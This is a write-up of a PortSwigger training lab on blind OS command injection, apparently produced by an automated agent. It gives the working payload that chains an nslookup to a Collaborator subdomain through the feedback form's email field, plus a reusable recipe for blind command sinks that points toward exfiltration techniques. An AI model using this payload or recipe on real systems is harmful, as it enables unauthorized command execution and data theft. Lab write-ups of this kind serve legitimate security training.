# PortSwigger Lab

## Lab

Blind OS command injection with out-of-band interaction

URL: https://0abd00cd046c98fc80259e6c002300b1.web-security-academy.net

## Vulnerability Class

OS command injection — blind with out-of-band interaction (DNS lookup to Collaborator; platform attributes to instance)

## Objective

Trigger a server-side outbound interaction to the public Collaborator server (established by evidence: no submit mechanism; `/` flipped to `is-solved` after the injection). Official description not read.

## Initial Observations

- Shop + `/feedback/submit` (csrf + name/email/subject/message, session-bound).
- Baseline submit → 200 in ~0.33s.

## Hypotheses

- H1: Feedback email reaches shell (sibling-lab pattern) — `nslookup` to Collaborator is the lightest OOB primitive.
- H2: Platform firewall permits Collaborator egress (per blind-SSRF lesson; webhook-type receivers would be blocked).
- H3: Instance-attributed interaction flips solved marker (no client polling possible here).

## Attempts

1. Session-bound baseline (0.33s) — valid-request foundation.
2. `email=t@t.com; nslookup q8z4k2m7n9.burpcollaborator.net #` → 200 in 0.36s (fast — DNS resolves quickly or async); unique subdomain for hygiene.
3. Waited 60s → `/` → `is-solved`/`Solved`. WORKED first injection.

## What Failed

- Nothing material; no dead ends (prior blind lessons compressed the path: session-bind → separator+`#` → Collaborator → wait → marker).

## What Worked

- Single feedback injection with DNS lookup → solved by attribution.

## Burp Observations

- Not used via Burp MCP (no Collaborator client available); arbitrary unique `*.burpcollaborator.net` subdomain sufficed (attribution by instance source, as in the SSRF blind lab).

## Browser Observations

- Not required. Pure HTTP POST.

## CLI / Tool Observations

- curl with session jar; `sleep 60` + marker re-check for the async window (shorter than SSRF blind's 90s — still wait, don't assume instant).

## Root Cause

Feedback email value interpolated into a shell command without sanitization; `;`-chained `nslookup` (with `#` neutralizing any trailer) forces server-side DNS resolution of an attacker-influenced name — blind command execution with OOB interaction as its only signal.

## Verification

- Baseline-vs-injection shape matches the proven feedback-sink pattern (session-bound 200s); unique subdomain isolates attribution.
- `/` marker flip `is-notsolved` → `is-solved` after the async window. Deterministic end state (single variable changed: the injected lookup).

## Impact

Blind OS command execution (demonstrated OOB DNS); same primitive enables time-based exfiltration, redirection exfiltration, and full compromise with output channels.

## Why The Successful Approach Worked

- Composed two stored lessons directly (feedback-sink shape + Collaborator-only egress) instead of re-deriving either.
- Lightest primitive first (`nslookup`, no output needed, fast return) — no brute-force or scanning.
- Waited out the async window before concluding (60s), per blind-SSRF lesson.

## Generalization

- For blind command sinks with OOB needs: session-bind → `; nslookup <unique>.burpcollaborator.net #` → wait 60–90s → marker check. DNS-only is the cheapest interaction.
- Solve attribution is typically by instance source — unique subdomain, no client session required.
- If marker hasn't flipped, escalate to time-proofs (`sleep`) and redirection exfiltration before doubting the sink.

## Lessons Learned

- Cross-class composition (OS-command sink × SSRF-blind OOB discipline) solves faster than either class alone — the skill system compounds when layers stay separated and retrievable.
- First OOB-command lab: receiver/wait/attribution rules transfer verbatim from blind-SSRF methodology.

## Related Methodology

- methodology/injection.md (blind OOB interaction — to be extended)

## References

- Solved instance: https://0abd00cd046c98fc80259e6c002300b1.web-security-academy.net/
- Deliberately did NOT read the official solution/writeup for this lab.
